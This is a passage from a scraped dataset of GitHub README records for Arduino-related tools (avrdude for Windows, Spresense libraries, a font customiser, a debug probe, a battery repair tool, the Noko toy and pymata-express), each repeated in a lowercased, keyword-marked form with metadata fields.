drivers implement an api via the ftdi d2xx dlls. however, libftdi1 cannot use the d2xx interface, so it will not work with the plug-and-play drivers.\nthis build contains a patches library of libftdi. the patches load the d2xx dlls to support ftdi devices, so ftdi devices will just work.\nsupport hid devices via libhidapi\nthis build include the win32 version of libhidapi, and some patches, to allow hid devices to work out of the box.\nsupport visual studio\nthis build adds support for microsoft visual studio. building avrdude with microsoft visual c/c++ will give you the best user and debugging experience while working on windows.\nmiscellaneous bug-fixes and patches\nthis build fixes bug #54159: buffer overflow in usbtiny.c, which causes avrdude to crash when using the usbtiny programmer.\nsupport new microcontroller: attiny167\nreleases\nyou can find the latest releases of avrdude for windows here:\nhttps://github.com/mariusgreuel/avrdude/releases\nusers manual\nyou can find the original users manual (does not contain avrdude for windows extras) of avrdude here:\nhttps://www.nongnu.org/avrdude/user-manual/avrdude.html\nbuild\nbuilding avrdude for windows\nwindows prerequisites\nin order to build avrdude on windows, you need:\nmicrosoft visual studio 2019 with 'desktop development with c++' enabled\nwindows build instructions\nto build avrdude on windows, do the following:\ngit clone --branch windows https://github.com/mariusgreuel/avrdude\nopen the solution avrdude.sln and build the project.\nnote: the folder msvc\\generated includes pre-built files from the avrdude configure and grammar generation.\nbuilding avrdude for linux\nnote that the avrdude for linux version does not contain all extra windows features. the features that have been added to the stock version of avrdude include:\nsupport micronucleus bootloader\nsupport teensy halfkay bootloader\nlinux prerequisites\nin order to build avrdude on linux, you need to install the following packages:\nsudo apt install git make gcc automake libtool flex bison libelf-dev libusb-dev libftdi1-dev libhidapi-dev\nlinux build instructions\nto build avrdude on linux, run the following commands:\ngit clone --branch windows https://github.com/mariusgreuel/avrdude\ncd avrdude\n./bootstrap\n./configure\nmake\nto install a local build of avrdude on your system, run the following command:\nsudo make install\nlinux udev rules\nif you intent to use either the micronucleus or teensy bootloader, you should edit the udev rules so that you can run avrdude without root.\nfor instance, if you are on ubuntu and you installed the avrdude package, you would edit /lib/udev/rules.d/60-avrdude.rules and add the following rules:\n# micronucleus bootloader\nsubsystem==\"usb\", attr{idvendor}==\"16d0\", attr{idproduct}==\"0753\", tag+=\"uaccess\"\n# teensy bootloader\nsubsystem==\"usb\", attr{idvendor}==\"16c0\", attr{idproduct}==\"0478\", tag+=\"uaccess\"\ntroubleshooting tips & tricks\natmel dfu device driver broken\nthe current version of the atmel dfu drivers that are distributed via the windows update are goofed up (@atmel: it might have something to do with the fact that you commented out the copyfiles sections!). symptoms are:\nyou cannot use avrdude to connect to an atmel dfu device, and you get the error message \"no matching usb device found\".\nwhen installing the drivers via windows update, you get the error message \"windows encountered a problem installing the drivers for your device\" and \"a service installation section in this inf is invalid.\"\nin windows device manager, the atmel dfu device shows up as an unknown device.\nyou should use an older driver package that does not contain this bug.\noutdated libusb0 driver\nthe most current version of libusb0.sys is 1.2.6.0, signed on 12/17/2012 by travis lee robinson. if you are using an older version (check with windows device manager), you may not be able to connect to your usb devices using the libusb0 driver.\nlicense\navrdude is licensed under the gnu gplv2.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000801, "year": null}, {"Unnamed: 0": 2844, "autor": 804, "date": null, "content": "Welcome to Spresense libs for Arduino compatible project\nClone this repository.\n$ git clone git@github.com:sonydevworld/spresense-arduino-compatible.git\nDirectory structure\nspresense-arduino-compatible\n|-- Arduino15\n| |-- packages/SPRESENSE - Spresense packages\n| | |-- hardware\n| | | `--spresense - Spresense reference board codes\n| | | `-- 1.0.0\n| | | |-- cores\n| | | |-- libraries\n| | | `-- variants\n| | `-- tools - Necessary tool chain and prebuilt binaries\n| | |-- spresense-tools - Spresense tools\n| | | `-- 1.0.0\n| | |-- spresense-sdk - Spresense SDK prebuilt binaries\n| | | `-- 1.0.0\n| | `-- gcc-arm-none-eabi - GCC compiler\n| | `-- 5.4.1\n| `-- package_spresense_index.json - Arduino IDE configuration json file\n`-- tools - Import/Export tools\nGetting started\nSpresense Arduino Library Getting Started Guide (English)\nSpresense Arduino \u30b9\u30bf\u30fc\u30c8\u30ac\u30a4\u30c9 (\u65e5\u672c\u8a9e)\nHow to prepare Arduino environment\nPull or Import GCC and Prebuilt SDK\n./tools/prepare_arduino.sh [OPTIONS...]\nOptions\nFor using local archive\nOption Argument Note\n-g path/to/GCC-archive-path GCC archive path\n-s path/to/SDK-archive-path Prebuilt SDK archive path\nFor using local source code\nOption Argument Note\n-S path/to/spresense-sdk-path Local Spresense SDK build root path\n-v Board_variant Target board variant (default:spresense)\n-c spresense or spresense_sub Target SDK configuration (default: spresense)\n-d disable or enable Target debug configuration (default: disable)\n-M \"SDK\" Manual configuration by menuconfig\n-G \"SDK\" Manual configuration by gconfig\n-Q \"SDK\" Manual configuration by qconfig\n-i - Do not change SDK configuration\nOther option\nOption Argument Note\n-H Windows or Linux64 or Mac Arduino IDE Host OS\n-p - No network access option\n-h - Show help\nExample\nExport Spresense SDK prebuilt binary for MainCore/Debug:Disabled from local repository.\n$ ./tools/prepare_arduino.sh -S path/to/spresense -p\nExport Spresense SDK prebuilt binary for MainCore/Debug:Enabled from local repository.\n$ ./tools/prepare_arduino.sh -S path/to/spresense -d enable -p\nExport Spresense SDK prebuilt binary for SubCore/Debug:Disabled from local repository.\n$ ./tools/prepare_arduino.sh -S path/to/spresense -c spresense_sub -d disable -p\nExport Spresense SDK prebuilt binary for SubCore/Debug:Enabled from local repository.\n$ ./tools/prepare_arduino.sh -S path/to/spresense -c spresense_sub -d enable -p\nExport Spresense SDK prebuilt binary for MainCore/Debug:Disabled from local repository with configuration change.\n$ ./tools/prepare_arduino.sh -S path/to/spresense -M SDK -p\nCreating Arduino boards manager local install package\nTo create a Arduino boards manager files for manual installation simply type:\n$ make\nThis command will generate the following files:\nout/package_spresense_local_index.json\nout/staging/spresense-v*.*.*_local.tar.gz\nout/staging/spresense-tools-v*.*.*_local.tar.gz\nout/staging/spresense-sdk-v*.*.*_local.tar.gz\nManual install\nCopy out/staging into <Arduino15> directory.\nSet package_spresense_local_index.json URL into Additional Boards Manager URLs in Arduino IDE.\nInstall local spresense board package by Boards Manager in Arduino IDE as same as official package.\n<Arduino15>:\nWindows: %userprofile%\\AppData\\Local\\Arduino15\nmacOS: ~/Library/Arduino15\nUbuntu: ~/.arduino15\npackage_spresense_local_index.json URL:\nfile://path/to/out/package_spresense_local_index.json", "link": "https://github.com/sonydevworld/spresense-arduino-compatible", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "welcome to spresense libs for arduino compatible project\nclone this repository.\n$ git clone git@github.com:sonydevworld/spresense-arduino-compatible.git\ndirectory structure\nspresense-arduino-compatible\n|-- arduino15\n| |-- packages/spresense - spresense packages\n| | |-- hardware\n| | | `--spresense - spresense reference board codes\n| | | `-- 1.0.0\n| | | |-- cores\n| | | |-- libraries\n| | | `-- variants\n| | `-- tools - necessary -----> tool !!!  chain and prebuilt binaries\n| | |-- spresense-tools - spresense tools\n| | | `-- 1.0.0\n| | |-- spresense-sdk - spresense sdk prebuilt binaries\n| | | `-- 1.0.0\n| | `-- gcc-arm-none-eabi - gcc compiler\n| | `-- 5.4.1\n| `-- package_spresense_index.json - arduino ide configuration json file\n`-- tools - import/export tools\ngetting started\nspresense arduino library getting started guide (english)\nspresense arduino \u30b9\u30bf\u30fc\u30c8\u30ac\u30a4\u30c9 (\u65e5\u672c\u8a9e)\nhow to prepare arduino environment\npull or import gcc and prebuilt sdk\n./tools/prepare_arduino.sh [options...]\noptions\nfor using local archive\noption argument note\n-g path/to/gcc-archive-path gcc archive path\n-s path/to/sdk-archive-path prebuilt sdk archive path\nfor using local source code\noption argument note\n-s path/to/spresense-sdk-path local spresense sdk build root path\n-v board_variant target board variant (default:spresense)\n-c spresense or spresense_sub target sdk configuration (default: spresense)\n-d disable or enable target debug configuration (default: disable)\n-m \"sdk\" manual configuration by menuconfig\n-g \"sdk\" manual configuration by gconfig\n-q \"sdk\" manual configuration by qconfig\n-i - do not change sdk configuration\nother option\noption argument note\n-h windows or linux64 or mac arduino ide host os\n-p - no network access option\n-h - show help\nexample\nexport spresense sdk prebuilt binary for maincore/debug:disabled from local repository.\n$ ./tools/prepare_arduino.sh -s path/to/spresense -p\nexport spresense sdk prebuilt binary for maincore/debug:enabled from local repository.\n$ ./tools/prepare_arduino.sh -s path/to/spresense -d enable -p\nexport spresense sdk prebuilt binary for subcore/debug:disabled from local repository.\n$ ./tools/prepare_arduino.sh -s path/to/spresense -c spresense_sub -d disable -p\nexport spresense sdk prebuilt binary for subcore/debug:enabled from local repository.\n$ ./tools/prepare_arduino.sh -s path/to/spresense -c spresense_sub -d enable -p\nexport spresense sdk prebuilt binary for maincore/debug:disabled from local repository with configuration change.\n$ ./tools/prepare_arduino.sh -s path/to/spresense -m sdk -p\ncreating arduino boards manager local install package\nto create a arduino boards manager files for manual installation simply type:\n$ make\nthis command will generate the following files:\nout/package_spresense_local_index.json\nout/staging/spresense-v*.*.*_local.tar.gz\nout/staging/spresense-tools-v*.*.*_local.tar.gz\nout/staging/spresense-sdk-v*.*.*_local.tar.gz\nmanual install\ncopy out/staging into <arduino15> directory.\nset package_spresense_local_index.json url into additional boards manager urls in arduino ide.\ninstall local spresense board package by boards manager in arduino ide as same as official package.\n<arduino15>:\nwindows: %userprofile%\\appdata\\local\\arduino15\nmacos: ~/library/arduino15\nubuntu: ~/.arduino15\npackage_spresense_local_index.json url:\nfile://path/to/out/package_spresense_local_index.json", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000804, "year": null}, {"Unnamed: 0": 2850, "autor": 810, "date": null, "content": "Adafruit GFX Pixel font customiser\nThis is a handy utility that goes well with the original fontconvert tool provided by Adafruit for converting TTF fonts to Adafruit_GFX .h format.\nJust paste the content of a .h font file, extract the glyphs, and you can edit them one by one by flipping the individual pixels for each glyphs, changing the advance, offset, or modifying the baseline.\nYou can then process our changes and create the improved file.\nThis is useful since the fontconvert utility does not always create all the characters correctly (a missing pixel here and there). It works best for small size fonts (< 12pt).\nContributors\nChris Marrin \u2014 added baseline, advance and offset support.\nthelevelofdetail \u2014 fixes for negative xOffsets\nBilly Donahue \u2014 fixes for xadvance clipping when using oblique fonts\nMats Engstrom \u2014 fixes to allow generating a range of glyphs\nChristof Arnosti \u2014 fixes to allow adding characters, improvements for disabled characters\nLicense\nMIT. See licence file.", "link": "https://github.com/tchapi/Adafruit-GFX-Font-Customiser", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "adafruit gfx pixel font customiser\nthis is a handy utility that goes well with the original fontconvert -----> tool !!!  provided by adafruit for converting ttf fonts to adafruit_gfx .h format.\njust paste the content of a .h font file, extract the glyphs, and you can edit them one by one by flipping the individual pixels for each glyphs, changing the advance, offset, or modifying the baseline.\nyou can then process our changes and create the improved file.\nthis is useful since the fontconvert utility does not always create all the characters correctly (a missing pixel here and there). it works best for small size fonts (< 12pt).\ncontributors\nchris marrin \u2014 added baseline, advance and offset support.\nthelevelofdetail \u2014 fixes for negative xoffsets\nbilly donahue \u2014 fixes for xadvance clipping when using oblique fonts\nmats engstrom \u2014 fixes to allow generating a range of glyphs\nchristof arnosti \u2014 fixes to allow adding characters, improvements for disabled characters\nlicense\nmit. see licence file.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000810, "year": null}, {"Unnamed: 0": 2851, "autor": 811, "date": null, "content": "CMSIS-DAP Cat Programmer\nAn Open-Source CMSIS-DAP Debug Probe based on DAPLink\nDescription\nDAP Cat Programmer is a low-cost of $3 dollars debug probe based on the CMSIS-DAP (also known as DAPLink) protocol standard and USB-Serial convert and it can realize USB convert to serial interface. It can be used to program and debug the application software running on Arm Cortex Microcontrollers.\nThe probe comes with indicator LEDs, a button to reset the target or trigger the firmware update, reversible USB-C connector and easy-to-use 10-pin 2.54mm Header.\nFeatures\nCH552G microcontroller\n16KB Flash, 1KB xRAM & 256B iRAM;\nROM-based USB drivers. Flash updates via USB supported.\nShipped with Arm Mbed DAPLink Firmware\nHID - CMSIS-DAP compliant debug channel\nUSB Serial bus convert and it can realize USB convert to serial interface.\nSupported Arduino IDE and OpenOCD\nLED indicator & Button\n3.3V DC-DC regulator with 1A output current\n3.3V Digital I/O Operating Voltage\nReversible USB-C Connector\nEasy-to-use 5-pin 2.54mm Header with SWD & UART interface\nVery small form factor: 20 x 48 mm\nSoftware compatible\nTested\nOpenOCD\nArduino IDE\nKeil\nPyOCD()\nWithout Test\nDap.js()\nIAR\nedbg\nManual available\nOur Wiki\nHow to debug hardware with openocd or pyocd\nDriver for windows\nZadig is the recommended tool to install drivers in Windows. The bootloader (4348,55E0) should be installed with WinUSB or libusb-win32 driver.\nYou can use USB Serial (CDC) driver for default CDC USB stack. If you tried to emulate another type of USB device without changing the PID/VID, you may need to uninstall the device before installing a new driver.\nSpecial Thanks\nDeqing Sun\nCH552 Group in Telegram\nLicense\nElectronic Cats invests time and resources providing this open source design, please support Electronic Cats and open-source hardware by purchasing products from Electronic Cats!\nDesigned by Electronic Cats.\nFirmware released under an GNU AGPL v3.0 license. See the LICENSE file for more information.\nHardware released under an CERN Open Hardware Licence v1.2. See the LICENSE_HARDWARE file for more information.\nElectronic Cats is a registered trademark, please do not use if you sell these PCBs.\n29 Agu 2020", "link": "https://github.com/ElectronicCats/DAP-Cat-Programmer", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "cmsis-dap cat programmer\nan open-source cmsis-dap debug probe based on daplink\ndescription\ndap cat programmer is a low-cost of $3 dollars debug probe based on the cmsis-dap (also known as daplink) protocol standard and usb-serial convert and it can realize usb convert to serial interface. it can be used to program and debug the application software running on arm cortex microcontrollers.\nthe probe comes with indicator leds, a button to reset the target or trigger the firmware update, reversible usb-c connector and easy-to-use 10-pin 2.54mm header.\nfeatures\nch552g microcontroller\n16kb flash, 1kb xram & 256b iram;\nrom-based usb drivers. flash updates via usb supported.\nshipped with arm mbed daplink firmware\nhid - cmsis-dap compliant debug channel\nusb serial bus convert and it can realize usb convert to serial interface.\nsupported arduino ide and openocd\nled indicator & button\n3.3v dc-dc regulator with 1a output current\n3.3v digital i/o operating voltage\nreversible usb-c connector\neasy-to-use 5-pin 2.54mm header with swd & uart interface\nvery small form factor: 20 x 48 mm\nsoftware compatible\ntested\nopenocd\narduino ide\nkeil\npyocd()\nwithout test\ndap.js()\niar\nedbg\nmanual available\nour wiki\nhow to debug hardware with openocd or pyocd\ndriver for windows\nzadig is the recommended -----> tool !!!  to install drivers in windows. the bootloader (4348,55e0) should be installed with winusb or libusb-win32 driver.\nyou can use usb serial (cdc) driver for default cdc usb stack. if you tried to emulate another type of usb device without changing the pid/vid, you may need to uninstall the device before installing a new driver.\nspecial thanks\ndeqing sun\nch552 group in telegram\nlicense\nelectronic cats invests time and resources providing this open source design, please support electronic cats and open-source hardware by purchasing products from electronic cats!\ndesigned by electronic cats.\nfirmware released under an gnu agpl v3.0 license. see the license file for more information.\nhardware released under an cern open hardware licence v1.2. see the license_hardware file for more information.\nelectronic cats is a registered trademark, please do not use if you sell these pcbs.\n29 agu 2020", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000811, "year": null}, {"Unnamed: 0": 2875, "autor": 835, "date": null, "content": "SmartBatteryHack\nThis is a hacking tool for smart batteries using SMBus. Originally written for a Dell J1KND battery that uses a BQ8050 fuel gauge IC.\nArduino folder contains the source code for an Uno/Mega which acts as an interface between the battery and an external computer. The I2C pins are connected to the smart battery's SDA/SCL pins with pullup resistors (4.7kOhm to 5V). The battery's ground pin has to be connected to the Uno/Mega's ground pin. Additionally the battery's \"system present\" pin may need to be grounded too (through a 100-1000 Ohm resistor). You need to install the SoftI2CMaster library to be able to use this sketch.\nGUI folder contains the C# source code and compiled binary for an external computer (Windows 7 and up) written in Visual Studio 2019.\nCheck the Wiki for tutorials.\nMore info about this project:\nhttps://boundarycondition.home.blog/2020/01/18/the-repairing-and-hacking-of-a-dell-j1knd-bq8050-laptop-battery/", "link": "https://github.com/laszlodaniel/SmartBatteryHack", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "smartbatteryhack\nthis is a hacking -----> tool !!!  for smart batteries using smbus. originally written for a dell j1knd battery that uses a bq8050 fuel gauge ic.\narduino folder contains the source code for an uno/mega which acts as an interface between the battery and an external computer. the i2c pins are connected to the smart battery's sda/scl pins with pullup resistors (4.7kohm to 5v). the battery's ground pin has to be connected to the uno/mega's ground pin. additionally the battery's \"system present\" pin may need to be grounded too (through a 100-1000 ohm resistor). you need to install the softi2cmaster library to be able to use this sketch.\ngui folder contains the c# source code and compiled binary for an external computer (windows 7 and up) written in visual studio 2019.\ncheck the wiki for tutorials.\nmore info about this project:\nhttps://boundarycondition.home.blog/2020/01/18/the-repairing-and-hacking-of-a-dell-j1knd-bq8050-laptop-battery/", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000835, "year": null}, {"Unnamed: 0": 2879, "autor": 839, "date": null, "content": "The DIY-Noko Monster, lovely and naughty, ready to build on your own. And everyone is invited to contribute. Noko is for everyone. What's new? See the newsblog.\nNoko is a multifunctional monster with an ATmega328 microcontroller on an Arduino Nano, display, clock, radio, mp3 player, four buttons as user interface, battery, voice set and tons of gimmicks, packed in a cuddly monster suit - sturdy, lovely and sometimes a bit mean and annoying. Just the way you want him to be. He, she or it - this is your decision and only depends on the voice set. In this repository Noko is a lad, a real bloke! A buddy for life and a companion by day and night. All he needs is a little power every now and then.\nNoko stands for Nora and niko's monster.\nNotes for non-German Noko makers\nThere are a German and an English version. Right now, the building wiki, the voice set, the manual and the optional EEPROM text files are in German. I'll try to translate the wiki and the manual one day. Until then, feel free to ask me for translation, if you need help. Contribute! I need an English voice set and English text files. In addition, any other language is welcome, Noko is to be cosmopolitan!\nPrerequisites\nNoko needs Arduino IDE 1.6.6 - 1.8.2 Copy the folder Noko/V10/src/[language]/Noko/ into your sketch folder. When using 1.6.10 or newer with AVR core 1.6.12 or newer, everything will compile out-of-the-box. With 1.6.9 or lower, Noko.ino won't compile, the sketch size is too large.\nOption 1: Install newest IDE and relax.\nOption 2: If you are using IDE 1.6.9 or lower, you need to install Optiboot onto your Nano.\nOption 3: Take one of the precompiled hex-files and follow the instructions in how to compile.\nIn any case, Optiboot is strongly recommended.\nContent\nNoko/\n\u251c\u2500\u2500 howto_compile/\n| Manual how compile the sketches in your Arduino IDE and precompiled sketches.\n| \u2514\u2500\u2500 precompiled/\n| Precompiled hex-files and windows tools.\n| \u251c\u2500\u2500 Deutsch/\n| | German Versions.\n| \u251c\u2500\u2500 English/\n| | English Versions.\n| \u251c\u2500\u2500 Flashtool/\n| | Linux firmware flasher.\n| \u2514\u2500\u2500 avrdude_win/\n| Avrdude files for windows.\n|\n\u251c\u2500\u2500 manual/\n| Noko manual in PDF format and a template for a packaging design.\n| \u2514\u2500\u2500 scribus/\n| Source documents for Scribus with all illustrations and fonts.\n|\n\u251c\u2500\u2500 mp3/\n| Female and male voice sets for Noko in German. English needed? Contribute!\n| \u251c\u2500\u2500 female/\n| | Female voice set for Nokos.\n| | \u2514\u2500\u2500 VoiceSet_226/\n| | New voice files.\n| \u2514\u2500\u2500 male/\n| Male voice sets\n| \u251c\u2500\u2500 alternative/\n| | Some less rude voice files.\n| \u251c\u2500\u2500 VoiceSet_111/\n| | Voice set for older Nokos.\n| \u2514\u2500\u2500 VoiceSet_226/\n| Enhanced voice set.\n|\n\u251c\u2500\u2500 schematics/\n| The Schematics for the Noko parts, the Noko sewing pattern and shopping lists.\n| \u2514\u2500\u2500 geda/\n| Source documents for gEDA.\n|\n\u251c\u2500\u2500 src/\n| Arduino sketches.\n| \u251c\u2500\u2500 deutsch/\n| | German version\n| | \u2514\u2500\u2500 Noko/\n| | Main sourcecode with all the required libraries.\n| \u251c\u2500\u2500 english/\n| | English version.\n| | \u2514\u2500\u2500 Noko/\n| | Same files but translated.\n| \u2514\u2500\u2500 tools/\n| Tools for using components and diagnostic.\n| \u251c\u2500\u2500 I2C-Scanner/\n| | Sketch to scan adresses of all connected I2C-devices.\n| \u251c\u2500\u2500 Noko_Diagnostics/\n| | Tool to test Noko functions via serial monitor.\n| \u251c\u2500\u2500 Noko_Disk1/\n| | Sketch to write the Disk1 textfile into 24LC256-EEPROMs.\n| \u251c\u2500\u2500 Noko_EEPROM_Disk0/\n| | Sketch to write Noko presets into the Arduino EEPROM and the Disk0 textfile into the\n| | AH24C32 EEPROM.\n| \u2514\u2500\u2500 Noko_Time/\n| Simple tool to set the current time without touching the EEPROM\n\u2514\u2500\u2500 write_EEPROM/\nTools to write data through serial connection to the Arduino and the EEPROMs.\nLet's get started!\nInterested in Noko? Great! Let's start here: German wiki.\nEnglish wiki will follow. One day...", "link": "https://github.com/NikolaiRadke/Noko", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "the diy-noko monster, lovely and naughty, ready to build on your own. and everyone is invited to contribute. noko is for everyone. what's new? see the newsblog.\nnoko is a multifunctional monster with an atmega328 microcontroller on an arduino nano, display, clock, radio, mp3 player, four buttons as user interface, battery, voice set and tons of gimmicks, packed in a cuddly monster suit - sturdy, lovely and sometimes a bit mean and annoying. just the way you want him to be. he, she or it - this is your decision and only depends on the voice set. in this repository noko is a lad, a real bloke! a buddy for life and a companion by day and night. all he needs is a little power every now and then.\nnoko stands for nora and niko's monster.\nnotes for non-german noko makers\nthere are a german and an english version. right now, the building wiki, the voice set, the manual and the optional eeprom text files are in german. i'll try to translate the wiki and the manual one day. until then, feel free to ask me for translation, if you need help. contribute! i need an english voice set and english text files. in addition, any other language is welcome, noko is to be cosmopolitan!\nprerequisites\nnoko needs arduino ide 1.6.6 - 1.8.2 copy the folder noko/v10/src/[language]/noko/ into your sketch folder. when using 1.6.10 or newer with avr core 1.6.12 or newer, everything will compile out-of-the-box. with 1.6.9 or lower, noko.ino won't compile, the sketch size is too large.\noption 1: install newest ide and relax.\noption 2: if you are using ide 1.6.9 or lower, you need to install optiboot onto your nano.\noption 3: take one of the precompiled hex-files and follow the instructions in how to compile.\nin any case, optiboot is strongly recommended.\ncontent\nnoko/\n\u251c\u2500\u2500 howto_compile/\n| manual how compile the sketches in your arduino ide and precompiled sketches.\n| \u2514\u2500\u2500 precompiled/\n| precompiled hex-files and windows tools.\n| \u251c\u2500\u2500 deutsch/\n| | german versions.\n| \u251c\u2500\u2500 english/\n| | english versions.\n| \u251c\u2500\u2500 flashtool/\n| | linux firmware flasher.\n| \u2514\u2500\u2500 avrdude_win/\n| avrdude files for windows.\n|\n\u251c\u2500\u2500 manual/\n| noko manual in pdf format and a template for a packaging design.\n| \u2514\u2500\u2500 scribus/\n| source documents for scribus with all illustrations and fonts.\n|\n\u251c\u2500\u2500 mp3/\n| female and male voice sets for noko in german. english needed? contribute!\n| \u251c\u2500\u2500 female/\n| | female voice set for nokos.\n| | \u2514\u2500\u2500 voiceset_226/\n| | new voice files.\n| \u2514\u2500\u2500 male/\n| male voice sets\n| \u251c\u2500\u2500 alternative/\n| | some less rude voice files.\n| \u251c\u2500\u2500 voiceset_111/\n| | voice set for older nokos.\n| \u2514\u2500\u2500 voiceset_226/\n| enhanced voice set.\n|\n\u251c\u2500\u2500 schematics/\n| the schematics for the noko parts, the noko sewing pattern and shopping lists.\n| \u2514\u2500\u2500 geda/\n| source documents for geda.\n|\n\u251c\u2500\u2500 src/\n| arduino sketches.\n| \u251c\u2500\u2500 deutsch/\n| | german version\n| | \u2514\u2500\u2500 noko/\n| | main sourcecode with all the required libraries.\n| \u251c\u2500\u2500 english/\n| | english version.\n| | \u2514\u2500\u2500 noko/\n| | same files but translated.\n| \u2514\u2500\u2500 tools/\n| tools for using components and diagnostic.\n| \u251c\u2500\u2500 i2c-scanner/\n| | sketch to scan adresses of all connected i2c-devices.\n| \u251c\u2500\u2500 noko_diagnostics/\n| | -----> tool !!!  to test noko functions via serial monitor.\n| \u251c\u2500\u2500 noko_disk1/\n| | sketch to write the disk1 textfile into 24lc256-eeproms.\n| \u251c\u2500\u2500 noko_eeprom_disk0/\n| | sketch to write noko presets into the arduino eeprom and the disk0 textfile into the\n| | ah24c32 eeprom.\n| \u2514\u2500\u2500 noko_time/\n| simple tool to set the current time without touching the eeprom\n\u2514\u2500\u2500 write_eeprom/\ntools to write data through serial connection to the arduino and the eeproms.\nlet's get started!\ninterested in noko? great! let's start here: german wiki.\nenglish wiki will follow. one day...", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000839, "year": null}, {"Unnamed: 0": 2883, "autor": 843, "date": null, "content": "pymata-express\nPlease note that the pymata-express feature set is now frozen and the project has been placed in maintenance mode.\nPlease consider using Telemetrix instead.\nA high performance, Python asyncio client for the Arduino Firmata Protocol.\nPymata-Express is a Firmata client that, like its conventional Python sibling, pymata4, allows you to control an Arduino using the high-performance FirmataExpress sketch. It uses a conventional Python API for those that do not need or wish to use the asyncio programming paradigm of pymata-express.\nIt supports both an enhanced version of StandardaFirmata 2.5.8, called FirmataExpress, as well as StandardFirmata and StandardFimataWiFi.\nFirmataExpress adds support for:\nHC-SR04 Ultrasonic Distance Sensors using a single pin.\nDHT Humidity/Temperature Sensors.\nStepper Motors.\nPiezo Tone Generation.\nBaud rate of 115200\nSpecial Note For FirmataExpress Users:\npymata-express now verifies the version of FirmataExpress in use. You may need to upgrade to the latest version of FirmataExpress using the Arduino IDE Library management tool.\nSpecial Note For Users Upgrading To Version 1.11\nThe callback data format has changed to be consistent with pymata4.\nCallback Prior To Version 1.11 Version 1.11 And Above\nanalog input [pin, current reported value, pin_mode, timestamp] [pin_mode = 2, pin, current reported value, pin_mode, timestamp]\ndigital input [pin, current reported value, pin_mode, timestamp] [pin_mode = 0, pin, current reported value, pin_mode, timestamp]\nhc-sr04 [pin, distance] [pin_mode=12, trigger pin number, distance, timestamp]\ni2c [Device address, data bytes] [pin_mode=6, i2c device address, data bytes, timestamp]\nMajor features\nFully documented intuitive API\nPython 3.7+ compatible.\nSet the pin mode and go!\nData change events may be associated with a callback function, or each pin can be polled for its last event change.\nEach data change event is time-stamped and logged.\nUser's Guide, Including Examples.\nImplements 100% of the StandardFirmata Protocol (StandardFirmata 2.5.8).\nAdvanced auto-detection of Arduino devices (when using FirmataExpress).\nHere is an example that monitors data changes on a digital input pin.\nimport asyncio\nimport time\nimport sys\nfrom pymata_express import pymata_express\n\"\"\"\nSetup a pin for digital input and monitor its changes\nusing a callback.\n\"\"\"\n# Setup a pin for analog input and monitor its changes\nDIGITAL_PIN = 12 # arduino pin number\nIDLE_TIME = .001 # number of seconds for idle loop to sleep\n# Callback data indices\n# Callback data indices\nCB_PIN_MODE = 0\nCB_PIN = 1\nCB_VALUE = 2\nCB_TIME = 3\nasync def the_callback(data):\n\"\"\"\nA callback function to report data changes.\nThis will print the pin number, its reported value and\nthe date and time when the change occurred\n:param data: [pin, current reported value, pin_mode, timestamp]\n\"\"\"\ndate = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(data[CB_TIME]))\nprint(f'Pin: {data[CB_PIN]} Value: {data[CB_VALUE]} Time Stamp: {date}')\nasync def digital_in(my_board, pin):\n\"\"\"\nThis function establishes the pin as a\ndigital input. Any changes on this pin will\nbe reported through the call back function.\n:param my_board: a pymata_express instance\n:param pin: Arduino pin number\n\"\"\"\n# set the pin mode\nawait my_board.set_pin_mode_digital_input(pin, callback=the_callback)\nwhile True:\ntry:\nawait asyncio.sleep(IDLE_TIME)\nexcept KeyboardInterrupt:\nawait board.shutdown()\nsys.exit(0)\n# get the event loop\nloop = asyncio.get_event_loop()\n# instantiate pymata_express\nboard = pymata_express.PymataExpress()\ntry:\n# start the main function\nloop.run_until_complete(digital_in(board, 12))\nexcept (KeyboardInterrupt, RuntimeError) as e:\nloop.run_until_complete(board.shutdown())\nsys.exit(0)\nSample console output as input change events occur:\nPin: 12 Value: 0 Time Stamp: 2020-03-10 13:26:22\nPin: 12 Value: 1 Time Stamp: 2020-03-10 13:26:27\nThis project was developed with Pycharm", "link": "https://github.com/MrYsLab/pymata-express", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "pymata-express\nplease note that the pymata-express feature set is now frozen and the project has been placed in maintenance mode.\nplease consider using telemetrix instead.\na high performance, python asyncio client for the arduino firmata protocol.\npymata-express is a firmata client that, like its conventional python sibling, pymata4, allows you to control an arduino using the high-performance firmataexpress sketch. it uses a conventional python api for those that do not need or wish to use the asyncio programming paradigm of pymata-express.\nit supports both an enhanced version of standardafirmata 2.5.8, called firmataexpress, as well as standardfirmata and standardfimatawifi.\nfirmataexpress adds support for:\nhc-sr04 ultrasonic distance sensors using a single pin.\ndht humidity/temperature sensors.\nstepper motors.\npiezo tone generation.\nbaud rate of 115200\nspecial note for firmataexpress users:\npymata-express now verifies the version of firmataexpress in use. you may need to upgrade to the latest version of firmataexpress using the arduino ide library management -----> tool !!! .\nspecial note for users upgrading to version 1.11\nthe callback data format has changed to be consistent with pymata4.\ncallback prior to version 1.11 version 1.11 and above\nanalog input [pin, current reported value, pin_mode, timestamp] [pin_mode = 2, pin, current reported value, pin_mode, timestamp]\ndigital input [pin, current reported value, pin_mode, timestamp] [pin_mode = 0, pin, current reported value, pin_mode, timestamp]\nhc-sr04 [pin, distance] [pin_mode=12, trigger pin number, distance, timestamp]\ni2c [device address, data bytes] 